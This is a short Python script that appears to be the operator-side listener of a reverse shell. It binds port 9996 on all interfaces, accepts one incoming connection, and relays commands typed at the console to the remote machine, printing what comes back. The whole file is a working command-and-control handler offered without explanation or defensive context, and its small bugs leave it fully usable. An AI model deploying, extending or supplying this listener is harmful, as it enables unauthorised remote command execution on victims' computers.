import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9996
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error"+ str(msg))
def bind_socket():
    try:
        global host
        global port
        global s
        print("socket binding to port " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket creation error"+ str(msg)+'\n'+ "Retrying")
        bind_socket()

#to establish a connection the socket must be listening...

def socket_accept():
    conn, address = s.accept()

    print("connection has been established:  IP address"+ address[0] +"port"+ str(conn))
    send_command(conn)
    conn.close()

def send_command(conn):
    while True:
        cmd=input()
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()




